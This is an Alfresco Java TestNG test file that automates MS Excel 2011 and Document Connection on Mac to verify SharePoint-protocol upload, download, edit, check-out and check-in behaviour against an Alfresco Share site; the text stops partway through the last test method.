/*
 * Copyright (C) 2005-2015 Alfresco Software Limited.
 * This file is part of Alfresco
 * Alfresco is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * Alfresco is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU Lesser General Public License for more details.
 * You should have received a copy of the GNU Lesser General Public License
 * along with Alfresco. If not, see <http://www.gnu.org/licenses/>.
 */

package org.alfresco.share.sharepoint.office2011;

import java.io.File;

import org.alfresco.application.mac.MicrosoftExcel2011;
import org.alfresco.po.share.site.document.DocumentDetailsPage;
import org.alfresco.test.FailedTestListener;
import org.alfresco.share.util.DocumentLibraryUtil;
import org.alfresco.share.util.FileBaseUtils;
import org.alfresco.share.util.ShareUser;
import org.alfresco.share.util.ShareUserSitePage;
import org.testng.Assert;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Listeners;
import org.testng.annotations.Optional;
import org.testng.annotations.Parameters;
import org.testng.annotations.Test;

/**
 * Please pay attention that there is an error that sometimes occurs on Office2011 application on MAC: issue logged as MNT-12847
 * 
 * @description
 *              This tests should be executed ONLY on a OSx system, where Office2011 is installed
 *              The Alfresco Server version should be lower than 5.0 (Alfresco Enterprise v4.2.5 version was used on Tests)
 * @author Paul Brodner
 */
@Listeners(FailedTestListener.class)
public class MSExcel2011Tests extends MS2011BaseTest
{
    private File xlsMacOfficeFile;
    private File xls9760TestFile;
    private File xls9761TestFile;
    private File xls9762TestFile;
    private File xls9763TestFile;
    private File xls9764TestFile;
    private File xls9765TestFile;
    private File xls9766TestFile;
    private File xls9767TestFile;
    private File xls9768TestFile;
    private File xls9769TestFile;
    private File xls9770TestFile;
    private File xls9771TestFile;
    private File xls9772TestFile;
    private File xls9773TestFile;
    private File xls9775TestFile;
    private File xls9776TestFile;
    private File xls9777TestFile;

    @Test(groups = { "DataPrepMacExcel" })
    public void dataPrep_AONE() throws Exception
    {
        initializeDataPrep();
        xls9765TestFile.delete();
        tmpTestFile("xlsx").delete();
    }

    @BeforeClass(alwaysRun = true)
    @Parameters({ "TESTID" })
    public void setup(@Optional String TESTID) throws Exception
    {
        super.setup(TESTID);

        appExcel2011 = new MicrosoftExcel2011();
        appExcel2011.killProcesses();

        // used from testdata folder
        xlsMacOfficeFile = getTestDataFile(SHAREPOINT, "MacOffice.xlsx");
        xls9760TestFile = getTestDataFile(SHAREPOINT, "AONE-9760.xlsx");
        xls9761TestFile = getTestDataFile(SHAREPOINT, "AONE-9761.xlsx");
        xls9762TestFile = getTestDataFile(SHAREPOINT, "AONE-9762.xlsx");
        xls9763TestFile = getTestDataFile(SHAREPOINT, "AONE-9763.xlsx");
        xls9765TestFile = getTestDataFile(SHAREPOINT, "AONE-9765.xlsx");
        xls9764TestFile = getTestDataFile(SHAREPOINT, "InputOpen.xlsx");
        xls9766TestFile = getTestDataFile(SHAREPOINT, "AONE-9766.xlsx");

        xls9767TestFile = getDuplicatedFile(xlsMacOfficeFile, "AONE-9767.xlsx");
        xls9768TestFile = getDuplicatedFile(xlsMacOfficeFile, "AONE9768crash.xlsx");
        xls9769TestFile = getDuplicatedFile(xlsMacOfficeFile, "AONE-9769.xlsx");
        xls9770TestFile = getDuplicatedFile(xlsMacOfficeFile, "AONE-9770.xlsx");
        xls9771TestFile = getDuplicatedFile(xlsMacOfficeFile, "AONE-9771.xlsx");
        xls9772TestFile = getDuplicatedFile(xlsMacOfficeFile, "AONE-9772.xlsx");
        xls9773TestFile = getDuplicatedFile(xlsMacOfficeFile, "AONE-9773.xlsx");
        xls9775TestFile = getDuplicatedFile(xlsMacOfficeFile, "AONE-9775.xlsx");
        xls9776TestFile = getDuplicatedFile(xlsMacOfficeFile, "AONE-9776.xlsx");
        xls9777TestFile = getDuplicatedFile(xlsMacOfficeFile, "AONE-9777.xlsx");

        // this files will be uploaded on dataprep
        testFiles.add(xls9761TestFile);
        testFiles.add(xls9762TestFile);
        testFiles.add(xls9763TestFile);
        testFiles.add(xls9764TestFile);
        testFiles.add(xls9766TestFile);
        testFiles.add(xls9767TestFile);
        testFiles.add(xls9768TestFile);
        testFiles.add(xls9769TestFile);
        testFiles.add(xls9770TestFile);
        testFiles.add(xls9771TestFile);
        testFiles.add(xls9772TestFile);
        testFiles.add(xls9773TestFile);
        testFiles.add(xls9775TestFile);
        testFiles.add(xls9776TestFile);
        testFiles.add(xls9777TestFile);
    }

    /**
     * Preconditions
     * <ul>
     * <li>Any site is created in Share;</li>
     * <li>Any MS Excel document is uploaded to the site's document library;</li>
     * <li>MS Document Connection is opened;</li>
     * <li>A sharepoint connection to Alfresco is created;</li>
     * <li>Site Document Library is opened</li>
     * </ul>
     */
    @Test(groups = "Enterprise4.2", description = "Upload the document - Add file action")
    public void AONE_9760() throws Exception
    {
        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);

        // ---- Step 1 ----
        // ---- Step action ----
        // Click on Add File Button
        // ---- Expected results ----
        // Upload New Files window is opened

        // ---- Step 2 ----
        // ---- Step action ----
        // Choose the created in the pre-condition document and click on Upload button.
        // ---- Expected results ----
        // The document is uploaded
        getMDC().addFile(xls9760TestFile);

        // I choose to open DL here so in this time, the document will be uploaded from step2 - no wait required
        openDocumentLibraryForTest();

        // ---- Step 3 ----
        // ---- Step action ----
        // Verify the document library of the site in the Share.
        // ---- Expected results ----
        // The document was uploaded correctly
        Assert.assertTrue(documentLibraryPage.isFileVisible(xls9760TestFile.getName()), "The document was uploaded corectly.");
        // No data was lost (checking the size of the document uploaded)
        Assert.assertEquals(DocumentLibraryUtil.getDocumentProperties(documentLibraryPage, xls9760TestFile.getName()).size(), 10,
                "The document was uploaded correctly");

        getMDC().exitApplication();
    }

    /**
     * Preconditions
     * <ul>
     * <li>Any site is created in Share;</li>
     * <li>Any MS Excel document is uploaded to the site's document library;</li>
     * <li>MS Document Connection is opened;</li>
     * <li>A sharepoint connection to Alfresco is created;</li>
     * <li>Site Document Library is opened</li>
     * </ul>
     */
    @Test(groups = "Enterprise4.2", description = "Download the document - Save as action")
    public void AONE_9761() throws Exception
    {
        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
        String testFile = xls9761TestFile.getName();
        File tmpFile = tmpTestFile("xlsx");
        // ---- Step 1----
        // ---- Step action ----
        // Choose the document and choose Save As action from the context menu.
        // ---- Expected results ----
        // Save document_name.docx As window is opened.
        getMDC().search(testFile);

        // ---- Step 2 ----
        // ---- Step action ----
        // Choose any location, e.g. Desktop, specify any name and click on Save button.
        // ---- Expected results ----
        // The document is downloaded.
        getMDC().saveAsFirstDocumentAs(tmpFile);

        // ---- Step 3 ----
        // ---- Step action ----
        // Verify the chosen location, e.g. Desktop.
        // ---- Expected results ----
        // The document was downloaded correctly. No data was lost.
        tmpFile = tmpTestFile("xlsx");
        boolean fileSaved = FileBaseUtils.waitForFile(tmpFile);

        Assert.assertTrue(fileSaved, "The document " + tmpFile.getName() + " was saved localy from MDC.");
        Assert.assertEquals(tmpFile.length(), 8679, "No data was lost.");
        tmpFile.delete();
        getMDC().exitApplication();
    }

    /**
     * Preconditions
     * <ul>
     * <li>Any site is created in Share;</li>
     * <li>Any MS Excel document is uploaded to the site's document library;</li>
     * <li>MS Document Connection is opened;</li>
     * <li>A sharepoint connection to Alfresco is created;</li>
     * <li>Site Document Library is opened</li>
     * </ul>
     * 
     * @throws Exception
     */
    @Test(groups = "Enterprise4.2", description = "Read document")
    public void AONE_9762() throws Exception
    {
        openDocumentLibraryForTest();
        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
        String testFile = xls9762TestFile.getName();

        // ---- Step 1 ----
        // ---- Step action ----
        // Choose the document and click on Read button.
        // ---- Expected results ----
        // The document is opened in a read-only mode.
        getMDC().search(testFile);
        getMDC().readFirstDocument();

        appExcel2011.addCredentials(testUser, DEFAULT_PASSWORD);
        boolean isReadOnly = appExcel2011.isFileInReadOnlyMode(testFile);
        Assert.assertTrue(isReadOnly, "The document is opened in a read-only mode.");
        getMDC().focus();

        // ---- Step 2 ----
        // ---- Step action ----
        // Verify the document library of the site in the Share.
        // ---- Expected results ----
        // The document is not locked. No changes are made.
        boolean isLocked = DocumentLibraryUtil.isFileLocked(documentLibraryPage, testFile);
        Assert.assertFalse(isLocked, "The document is not locked. No changes are made.");

        // ---- Step 3 ----
        // ---- Step action ----
        // Try to enter any changes to the opened document.
        // ---- Expected results ----
        // No changes can be made. The document is read-only.
        // {Paul: nothing to add here}

        // ---- Step 4 ----
        // ---- Step action ----
        // Try to check out the opened document.
        // ---- Expected results ----
        // The document cannot be checked out. "You can't edit this file. You have the file open as read-only. To edit the file, close it, and then try again."
        // dialog message is displayed.
        // {Paul: cannot reproduce this on MAC. In this case the Checkout button is disabled, so I check for this functionality}

        Assert.assertEquals(getMDC().isBtnCheckOutEnabled(), 0, "The file cannot be Checked out");
        getMDC().exitApplication();
        appExcel2011.exitApplication();
    }

    /**
     * Preconditions
     * <ul>
     * <li>Any site is created in Share;</li>
     * <li>Any MS Excel document is uploaded to the site's document library;</li>
     * <li>MS Document Connection is opened;</li>
     * <li>A sharepoint connection§ to Alfresco is created;</li>
     * <li>Site Document Library is opened</li>
     * </ul>
     */
    @Test(groups = "Enterprise4.2", description = "Edit document")
    public void AONE_9763() throws Exception
    {
        openDocumentLibraryForTest();
        String testFile = xls9763TestFile.getName();
        // we need to know first the current version of the document
        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(testFile).render();
        String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();

        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);

        // ---- Step 1 ----
        // ---- Step action ----
        // Choose the document and click on Edit button.
        // ---- Expected results ----
        // The document is opened in a read-write mode.
        getMDC().search(testFile);
        getMDC().editFirstDocument();
        appExcel2011.addCredentials(testUser, DEFAULT_PASSWORD);
        appExcel2011.waitForWindow(testFile);

        boolean isEditMode = appExcel2011.isFileInEditMode(testFile);
        Assert.assertTrue(isEditMode, "The document is opened in a read-write mode.");

        // ---- Step 2 ----
        // ---- Step action ----
        // Verify the document library of the site in the Share.
        // ---- Expected results ----
        // The document is locked. "This document is locked by you." message is displayed.
        ShareUser.openDocumentLibrary(drone);
        boolean isLocked = DocumentLibraryUtil.isFileLockedByYou(documentLibraryPage, testFile);
        Assert.assertTrue(isLocked, "The document is locked. \"This document is locked by you.\" message is displayed.");

        // ---- Step 3 ----
        // ---- Step action ----
        // Try to enter any changes to the opened document.
        // ---- Expected results ----
        // The changes can be entered.
        appExcel2011.waitForWindow(testFile);
        appExcel2011.setFileName(testFile);
        appExcel2011.focus();
        appExcel2011.edit("some test data");

        // ---- Step 4 ----
        // ---- Step action ----
        // Try to check out the opened document.
        // ---- Expected results ----
        // The document's changes are saved automatically. The document is checked out.
        // {Paul: on MDC we cannot Checkout document after we EDIT. On EDIT, the document is auto-checked out. At this point can just SAVE the file}
        appExcel2011.save();

        // ---- Step 5 ----
        // ---- Step action ----
        // Verify the document library of the site in the Share.
        // ---- Expected results ----
        // Previously applied changes are present. A new minor version is created. The document is locked. "This document is locked by you for offline editing."
        // message is displayed.
        // {Paul: the document was not checked out. It was only Edited. This message will apply on checkout operation. We have a distinct test case for this:
        // AONE-9766}

        ShareUser.openDocumentLibrary(drone);
        isLocked = DocumentLibraryUtil.isFileLocked(documentLibraryPage, testFile);
        Assert.assertTrue(isLocked, "This document is locked by you for offline editing.");

        // check we have a new minor version
        String currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
        Assert.assertNotEquals(oldVersion, currentVersion, "A new minor version is created.");

        appExcel2011.closeFile(testFile);
        getMDC().exitApplication();
        appExcel2011.exitApplication();
        ShareUser.logout(drone);
    }

    /**
     * Preconditions
     * <ul>
     * <li>Any site is created in Share;</li>
     * <li>Any MS Excel document is uploaded to the site's document library;</li>
     * <li>MS Document Connection is opened;</li>
     * <li>A sharepoint connection to Alfresco is created;</li>
     * <li>Site Document Library is opened.</li>
     * <li>The document is opened for editing.</li>
     * <li>Any data is entered into the opened document.</li>
     * </ul>
     */
    @Test(groups = "Enterprise4.2", description = "Edit document - Upload changes")
    public void AONE_9764() throws Exception
    {
        openDocumentLibraryForTest();

        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(xls9764TestFile.getName());
        String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();

        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);

        // ---- Step 1 ----
        // ---- Step action ----
        // Choose the document and click on Upload button.
        // ---- Expected results ----
        // Upload Changes window is displayed.
        getMDC().search(xls9764TestFile.getName());
        getMDC().editFirstDocument();
        appExcel2011.addCredentials(testUser, DEFAULT_PASSWORD);

        // {Paul: cannot use Open URL, Application will crash}
        // appExcel2011.openURL(getVTIDocumentLibraryFilePath(testSiteName, xlsCommonFile.getName()));

        // ---- Step 2 ----
        // ---- Step action ----
        // Click on Upload Changes button.
        // ---- Expected results ----
        // The changes are uploaded. The file is still opened for editing.
        appExcel2011.waitForWindow(xls9764TestFile.getName());
        appExcel2011.edit("edited from excel");
        appExcel2011.setFileName(xls9764TestFile.getName());
        appExcel2011.save();

        // ---- Step 3 ----
        // ---- Step action ----
        // Verify the document library of the site in the Share.
        // ---- Expected results ----
        // The changes are applied. A new minor version is created. The document is still locked for editing.

        docDetailsPage.getDrone().refresh();
        docDetailsPage.getDrone().getCurrentPage().render();

        boolean isLocked = docDetailsPage.isCheckedOut();
        Assert.assertTrue(isLocked, "The document is still locked for editing.");

        String currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
        Assert.assertNotEquals(oldVersion, currentVersion, "A new minor version is created.");

        appExcel2011.exitApplication();
        ShareUser.logout(drone);
    }

    /**
     * Preconditions
     * <ul>
     * <li>Any site is created in Share;</li>
     * <li>Any MS Excel document is uploaded to the site's document library;</li>
     * <li>MS Document Connection is opened;</li>
     * <li>A sharepoint connection to Alfresco is created;</li>
     * <li>Site Document Library is opened.</li>
     * <li>The document is opened for editing.</li>
     * <li>Any data is entered into the opened document.</li>
     * </ul>
     */
    @Test(groups = "Enterprise4.2", description = "Edit document - Upload File")
    public void AONE_9765() throws Exception
    {
        appExcel2011.openApplication();
        appExcel2011.edit("some test data");
        appExcel2011.saveAs(xls9765TestFile);
        appExcel2011.exitApplication();

        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);

        // ---- Step 1 ----
        // ---- Step action ----
        // Choose the document and click on Upload button.
        // ---- Expected results ----
        // Upload Changes window is displayed.
        getMDC().addFile(xls9765TestFile);

        // {Paul: cannot use Open URL, Appliction will crash}
        // appExcel2011.openURL(getVTIDocumentLibraryFilePath(testSiteName, xlsCommonFile.getName()));

        // ---- Step 2 ----
        // ---- Step action ----
        // Click on Upload File button.
        // ---- Expected results ----
        // The changes are uploaded. The file is still opened for editing.
        openDocumentLibraryForTest();

        // ---- Step 3 ----
        // ---- Step action ----
        // Verify the document library of the site in the Share.
        // ---- Expected results ----
        // The changes are applied. A new minor version is created. The document is still locked for editing.
        Assert.assertEquals(DocumentLibraryUtil.getDocumentProperties(documentLibraryPage, xls9765TestFile.getName()).size(), 10);

        ShareUser.logout(drone);
    }

    @Test(groups = "Enterprise4.2", description = "Check Out")
    public void AONE_9766() throws Exception
    {
        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);

        // ---- Step 1 ----
        // ---- Step action ----
        // Choose the document and click on Check Out button.
        // ---- Expected results ----
        // The document is checked out and is opened for editing in a write mode in the default MS Excel app.

        getMDC().checkOutFile(xls9766TestFile.getName());
        openDocumentLibraryForTest();
        appExcel2011.waitForWindow(xls9766TestFile.getName());
        appExcel2011.exitApplication();

        // ---- Step 2 ----
        // ---- Step action ----
        // Verify the document library of the site in the Share.
        // ---- Expected results ----
        // The document is locked. "The document is locked by you for offline editing" message is displayed.
        Assert.assertEquals(ShareUserSitePage.getFileDirectoryInfo(drone, xls9766TestFile.getName()).getContentInfo(),
                "This document is locked by you for offline editing.");
    }

    /**
     * Any site is created in Share;
     * Any MS Excel document is uploaded to the site's document library;
     * MS Document Connection is opened;
     * A sharepoint connection to Alfresco is created;
     * Site Document Library is opened.
     * The document is checked out and is opened for editing.
     */
    @Test(groups = "Enterprise4.2", description = "Edit checked out document")
    public void AONE_9767() throws Exception
    {
        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);

        getMDC().checkOutFile(xls9767TestFile.getName());
        openDocumentLibraryForTest();
        appExcel2011.waitForWindow(xls9767TestFile.getName());

        // ---- Step 1 ----
        // ---- Step action ----
        // Enter any data.
        // ---- Expected results ----
        // he data is entered.
        appExcel2011.edit("edit with some data");
        appExcel2011.setFileName(xls9767TestFile.getName());
        appExcel2011.saveAndClose();
        getMDC().focus();

        // ---- Step 2 ----
        // ---- Step action ----
        // Save the document and close MS Excel app
        // ---- Expected results ----
        // The document is saved successfully. The document is still checked out.
        Assert.assertEquals(getMDC().isBtnCheckOutEnabled(), 0);

        // ---- Step 3 ----
        // ---- Step action ----
        // Verify the document library of the site in the Share.
        // ---- Expected results ----
        // The document is locked. "The document is locked by you for offline editing" message is displayed. No changes are present. No new versions were
        // created.
        appExcel2011.exitApplication();
        boolean isLocked = DocumentLibraryUtil.isFileLocked(documentLibraryPage, xls9767TestFile.getName());
        Assert.assertTrue(isLocked, "This document is locked by you for offline editing.");
    }

    /**
     * Any site is created in Share;
     * Any MS Excel document is uploaded to the site's document library;
     * MS Document Connection is opened;
     * A sharepoint connection to Alfresco is created;
     * Site Document Library is opened.
     * The document is opened for editing.
     * Any data is entered into the opened document.
     */
    @Test(groups = "Enterprise4.2", description = "Edit document - Save the changes")
    public void AONE_9768() throws Exception
    {
        String testFile = xls9768TestFile.getName();
        openDocumentLibraryForTest();
        // we need to know first the current version of the document
        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(testFile).render();
        String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();

        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
        appExcel2011.openApplication();

        getMDC().search(testFile);
        getMDC().editFirstDocument();
        appExcel2011.addCredentials(testUser, DEFAULT_PASSWORD);
        appExcel2011.waitForWindow(testFile);
        appExcel2011.edit("edit with some data");

        // ---- Step 1 ----
        // ---- Step action ----
        // Choose the File > Save action.
        // ---- Expected results ----
        // The document is saved correctly.
        appExcel2011.save();

        // ---- Step 2 ----
        // ---- Step action ----
        // Verify the document library of the site in the Share.
        // ---- Expected results ----
        // The changes are applied. A new minor version is created. The document is still locked.
        documentLibraryPage.getDrone().refresh();
        documentLibraryPage.getDrone().refresh();

        // check we have a new minor version
        String currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
        Assert.assertNotEquals(oldVersion, currentVersion, "A new major version is created.");
        Assert.assertTrue(docDetailsPage.isLockedByYou(), "The document is still locked.");

        // ---- Step 3 ----
        // ---- Step action ----
        // Close the document and the MS Excel app.
        // ---- Expected results ----
        // The document is closed.
        appExcel2011.closeFile(testFile);
        appExcel2011.waitUntilFileCloses(testFile);
        Assert.assertFalse(appExcel2011.isFileOpened(testFile));
        

        // ---- Step 4 ----
        // ---- Step action ----
        // Verify the document library of the site in the Share.
        // ---- Expected results ----
        // The document is unlocked and was not changed. No new version were created.
        documentLibraryPage.getDrone().refresh();
        appExcel2011.exitApplication();
        
        // check we have a new minor version
        currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
        Assert.assertNotEquals(oldVersion, currentVersion, "No new version were created.");
        Assert.assertFalse(docDetailsPage.isLockedByYou(), "The document is unlocked and was not changed.");
    }

    /**
     * Any site is created in Share;
     * Any MS Excel document is uploaded to the site's document library;
     * MS Document Connection is opened;
     * A sharepoint connection to Alfresco is created;
     * Site Document Library is opened.
     * The document is checked out and is opened for editing.
     */
    @Test(groups = "Enterprise4.2", description = "Check in without editing")
    public void AONE_9769() throws Exception
    {
        // preconditions-initialization
        String strCheckInComment = "test abcdefg";
        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);

        openDocumentLibraryForTest();
        // we need to know first the current version of the document
        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(xls9769TestFile.getName()).render();
        String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();

        getMDC().checkOutFile(xls9769TestFile.getName());
        openDocumentLibraryForTest();
        appExcel2011.waitForWindow(xls9769TestFile.getName());

        // ---- Step 1 ----
        // ---- Step action ----
        // Do not enter any data.
        // ---- Expected results ----
        // The data is entered.
        // {PaulB nothing to do here}

        // ---- Step 2 ----
        // ---- Step action ----
        // Do not save the document and close MS Excel app.
        // ---- Expected results ----
        // The document is not saved. The document is still checked out.
        appExcel2011.closeFile();

        // ---- Step 3 ----
        // ---- Step action ----
        // In Document Connection app, choose the checked out document and click on Check In.
        // ---- Expected results ----
        // Check In window is displayed.
        // {PaulB the doc is already checked out we don't need to checkout again}
        getMDC().focus();
        getMDC().checkInFile(xls9769TestFile.getName());

        // ---- Step 4 ----
        // ---- Step action ----
        // Enter any comment and click on Check In button.
        // ---- Expected results ----
        // The document is checked in successfully.
        getMDC().checkInWithComment(strCheckInComment);

        // ---- Step 5 ----
        // ---- Step action ----
        // Verify the document library of the site in the Share.
        // ---- Expected results ----
        // The document is unlocked. A new major version is created. The specified comment is present in the version history.
        documentLibraryPage.getDrone().refresh();
        // check we have a new minor version
        documentLibraryPage.selectFile(xls9769TestFile.getName()).render();

        String currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
        Assert.assertNotEquals(oldVersion, currentVersion, "A new major version is created.");
        Assert.assertFalse(docDetailsPage.isLockedByYou(), "The document is unlocked.");
        Assert.assertEquals(docDetailsPage.getCurrentVersionDetails().getComment(), strCheckInComment);
    }

    /*
     * Any site is created in Share;
     * Any MS Excel document is uploaded to the site's document library;
     * MS Document Connection is opened;
     * A sharepoint connection to Alfresco is created;
     * Site Document Library is opened.
     * The document is checked out and is opened for editing.
     */
    @Test(groups = "Enterprise4.2", description = "Check in and keep checked out")
    public void AONE_9770() throws Exception
    {
        String strCheckInComment = "test abcdefg";
        String testFile = xls9770TestFile.getName();

        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
        openDocumentLibraryForTest();
        // we need to know first the current version of the document
        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(testFile).render();
        String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
        getMDC().checkOutFile(testFile);
        appExcel2011.waitForWindow(testFile);
        appExcel2011.setFileName(testFile);

        // ---- Step 1 ----
        // ---- Step action ----
        // Enter any data.
        // ---- Expected results ----
        // The data is entered.
        appExcel2011.edit("edit file after checkout");

        // ---- Step 2 ----
        // ---- Step action ----
        // Save the document and close MS Excel app.
        // ---- Expected results ----
        // The document is saved. The document is still checked out.
        appExcel2011.saveAndClose();
        appExcel2011.waitUntilFileCloses(testFile);
        // ---- Step 3 ----
        // ---- Step action ----
        // In Document Connection app, choose the checked out document and click on Check In.
        // ---- Expected results ----
        // Check In window is displayed.
        getMDC().search(testFile);
        getMDC().clickCheckIn();
        getMDC().checkInWithComment(strCheckInComment);

        // ---- Step 4 ----
        // ---- Step action ----
        // Enter any comment, check 'Keep file checked out after checking in this version' check-box and click on Check In button.
        // ---- Expected results ----
        // The document is checked in successfully. The document is still marked as checked out in the Document Connection app.
        getMDC().search(testFile);
        getMDC().clickFirstDocument();
        Assert.assertEquals(getMDC().isBtnCheckOutEnabled(), 1, "The document is still marked as checked out in the Document Connection app");

        // ---- Step 5 ----
        // ---- Step action ----
        // Verify the document library of the site in the Share.
        // ---- Expected results ----
        // The document is still locked. A new major version is created. The specified comment is present in the version history. All changes are applied.

        documentLibraryPage.getDrone().refresh();
        // check we have a new minor version
        // documentLibraryPage.selectFile(xls9770TestFile.getName()).render();

        String currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
        Assert.assertNotEquals(oldVersion, currentVersion, "A new major version is created.");
        Assert.assertFalse(docDetailsPage.isLockedByYou(), "The document is unlocked.");
        Assert.assertEquals(docDetailsPage.getCurrentVersionDetails().getComment(), strCheckInComment);
    }

    /*
     * Any site is created in Share;
     * Any MS Excel document is uploaded to the site's document library;
     * MS Document Connection is opened;
     * A sharepoint connection to Alfresco is created;
     * Site Document Library is opened.
     * The document is checked out and is opened for editing.
     */
    @Test(groups = "Enterprise4.2", description = "Check in without keeping checked out")
    public void AONE_9771() throws Exception
    {
        String strCheckInComment = "test abcdefg";
        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
        openDocumentLibraryForTest();
        // we need to know first the current version of the document
        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(xls9771TestFile.getName()).render();
        String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
        getMDC().checkOutFile(xls9771TestFile.getName());
        appExcel2011.waitForWindow(xls9771TestFile.getName());
        appExcel2011.setFileName(xls9771TestFile.getName());

        // ---- Step 1 ----
        // ---- Step action ----
        // Enter any data.
        // ---- Expected results ----
        // The data is entered.
        appExcel2011.edit("edit file after checkout");

        // ---- Step 2 ----
        // ---- Step action ----
        // Save the document and close MS Excel app.
        // ---- Expected results ----
        // The document is saved. The document is still checked out.
        appExcel2011.focus();
        appExcel2011.save();
        appExcel2011.closeFile();

        // ---- Step 3 ----
        // ---- Step action ----
        // In Document Connection app, choose the checked out document and click on Check In.
        // ---- Expected results ----
        // Check In window is displayed.
        getMDC().search(xls9771TestFile.getName());
        getMDC().clickFirstDocument();
        getMDC().clickCheckIn();

        // ---- Step 4 ----
        // ---- Step action ----
        // Enter any comment, check 'Keep file checked out after checking in this version' check-box and click on Check In button.
        // ---- Expected results ----
        // The document is checked in successfully. The document is still marked as checked out in the Document Connection app.
        getMDC().keepFileCheckedOut(true);
        getMDC().checkInWithComment(strCheckInComment);
        getMDC().search(xls9771TestFile.getName());
        getMDC().clickFirstDocument();
        Assert.assertEquals(getMDC().isBtnCheckOutEnabled(), 1, "The document is still marked as checked out in the Document Connection app");

        // ---- Step 5 ----
        // ---- Step action ----
        // Verify the document library of the site in the Share.
        // ---- Expected results ----
        // The document is still locked. A new major version is created. The specified comment is present in the version history. All changes are applied.

        documentLibraryPage.getDrone().refresh();
        // check we have a new minor version
        // documentLibraryPage.selectFile(xls9770TestFile.getName()).render();

        String currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
        Assert.assertNotEquals(oldVersion, currentVersion, "A new major version is created.");
        Assert.assertFalse(docDetailsPage.isLockedByYou(), "The document is unlocked.");
        Assert.assertEquals(docDetailsPage.getCurrentVersionDetails().getComment(), strCheckInComment);
    }

    /*
     * Any site is created in Share;
     * Any MS Excel document is uploaded;
     * MS Document Connection is opened;
     * A sharepoint connection to Alfresco is created;
     * Site Document Library is opened;
     * The document is checked out;
     * Some changes are made for the document;
     * The changes are saved and Word app is closed.
     */
    @Test(groups = "Enterprise4.2", description = "Check In document. Cancel check in")
    public void AONE_9772() throws Exception
    {
        String strCheckInComment = "test abcdefg";
        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
        openDocumentLibraryForTest();
        // we need to know first the current version of the document
        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(xls9772TestFile.getName()).render();
        String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();

        getMDC().checkOutFile(xls9772TestFile.getName());
        appExcel2011.waitForWindow(xls9772TestFile.getName());
        appExcel2011.setFileName(xls9772TestFile.getName());
        appExcel2011.edit("edit file after checkout");
        appExcel2011.focus();
        appExcel2011.save();
        appExcel2011.closeFile();

        // ---- Step 1 ----
        // ---- Step action ----
        // Click on the document and then click on the Check In button on the top panel.
        // ---- Expected results ----
        // Check In window is displayed.
        getMDC().clickFirstDocument();
        getMDC().clickCheckIn();

        // ---- Step 2 ----
        // ---- Step action ----
        // Enter any string to the Comments section.
        // ---- Expected results ----
        // Data is entered.
        getMDC().getLdtp().enterString(strCheckInComment);

        // ---- Step 3 ----
        // ---- Step action ----
        // Click on Cancel button.
        // ---- Expected results ----
        // Check In window is closed. The document is still checked out.
        getMDC().clickCancel();

        // ---- Step 4 ----
        // ---- Step action ----
        // Log into the Share.
        // ---- Expected results ----
        // User is logged in successfully.

        // {paulb: we are already logged in from prerequisites}

        // ---- Step 5 ----
        // ---- Step action ----
        // Verify the document.
        // ---- Expected results ----
        // The document is checked out. The changes are not applied. Version isn't changed. No comment is added.
        documentLibraryPage.getDrone().refresh();

        String currentVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
        Assert.assertTrue(docDetailsPage.isCheckedOut(), "The document is checked out.");
        Assert.assertEquals(oldVersion, currentVersion, "Version isn't changed.");
        Assert.assertNotEquals(docDetailsPage.getCurrentVersionDetails().getComment(), strCheckInComment, "No comment is added.");
    }

    /*
     * Any site is created in Share;
     * Any MS Excel document is uploaded to the site's document library;
     * MS Document Connection is opened;
     * A share point connection to Alfresco is created;
     * Site Document Library is opened.
     * The document is checked out and is opened for editing.
     */
    @Test(groups = "Enterprise4.2", description = "Discard while editing document")
    public void AONE_9774() throws Exception
    {
        String testFile = xls9773TestFile.getName();

        openCleanMDCtool(testSiteName, testUser, DEFAULT_PASSWORD);
        openDocumentLibraryForTest();

        // we need to know first the current version of the document
        DocumentDetailsPage docDetailsPage = documentLibraryPage.selectFile(testFile).render();
        String oldVersion = docDetailsPage.getCurrentVersionDetails().getVersionNumber();
        getMDC().checkOutFile(testFile);
        appExcel2011.waitForWindow(testFile);
        appExcel2011.setFileName(testFile);

